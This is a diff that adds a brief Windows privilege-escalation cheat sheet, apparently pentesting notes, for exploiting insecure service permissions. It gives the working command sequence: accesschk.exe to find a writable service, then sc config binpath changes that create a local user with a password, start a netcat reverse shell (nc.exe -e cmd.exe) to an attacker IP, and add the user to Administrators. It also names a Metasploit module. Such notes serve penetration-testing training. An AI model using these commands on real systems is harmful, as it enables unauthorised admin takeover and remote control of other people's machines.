@@ -1,0 +1,26 @@
+# Exploiting the insecure service permissions
+# If metasploit then use -> exploit/windows/local/service_permissions
+
+
+1. Use accesschk.exe under Scripts/Privilege Escalation/ Windows/
+
+2. Do - accesschk.exe /accepteula FIRST!
+THEN accesschk.exe -uwcqv "OUR USER" *
+
+3. We find a vulnerable service on the last command
+
+4. sc qc "Vulnerable service here"
+
+5. Change the binpath as follows -
+
+  1. sc config "Vulnerable Service" binpath= "net user sukrit sukrit123 /add"
+  2. sc config "Vulnerable Service" binpath= "C:/path to nc.exe/ nc.exe <IP ADDRESS> 4444 -e cmd.exe"
+
+6. sc stop "Vulnerable service here"
+
+7. sc start "Vulnerable service here"
+
+NOTE : We may receive an error because net user is not a service so keep going.
+
+8. Add binpath again to add to administrators group
+  1.  sc config "Vulnerable Service" binpath= "net localgroup Administrators sukrit /add"
